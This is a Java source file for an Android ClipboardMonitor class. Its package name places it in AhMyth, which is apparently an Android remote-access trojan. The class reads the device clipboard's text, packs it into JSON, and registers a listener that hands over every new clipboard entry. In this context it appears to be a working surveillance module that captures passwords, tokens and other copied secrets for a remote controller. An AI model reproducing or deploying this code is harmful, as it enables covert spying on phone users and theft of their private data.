package ahmyth.mine.king.ahmyth;

import android.content.ClipData;
import android.content.Context;

import org.json.JSONObject;

public class ClipboardMonitor {

    private Context context;
    private android.content.ClipboardManager clipboardManager;
    private ClipboardMonitor.OnClipboardChangedListener listener;

    public interface OnClipboardChangedListener {
        void onClipboardChanged(String text);
    }

    public ClipboardMonitor(Context context) {
        this.context = context;
        this.clipboardManager = (android.content.ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
    }

    public JSONObject getClipboardText() {
        JSONObject result = new JSONObject();
        try {
            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    CharSequence text = clipData.getItemAt(0).getText();
                    if (text != null) {
                        result.put("text", text.toString());
                        result.put("hasData", true);
                    } else {
                        result.put("text", "");
                        result.put("hasData", false);
                    }
                } else {
                    result.put("text", "");
                    result.put("hasData", false);
                }
            } else {
                result.put("text", "");
                result.put("hasData", false);
            }
        } catch (Exception e) {
            e.printStackTrace();
            try {
                result.put("text", "");
                result.put("hasData", false);
                result.put("error", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return result;
    }

    public void setClipboardListener(OnClipboardChangedListener listener) {
        this.listener = listener;
        if (clipboardManager != null) {
            try {
                clipboardManager.addPrimaryClipChangedListener(new android.content.ClipboardManager.OnPrimaryClipChangedListener() {
                    @Override
                    public void onPrimaryClipChanged() {
                        if (ClipboardMonitor.this.listener != null) {
                            JSONObject clipboard = getClipboardText();
                            try {
                                if (clipboard.getBoolean("hasData")) {
                                    ClipboardMonitor.this.listener.onClipboardChanged(clipboard.getString("text"));
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

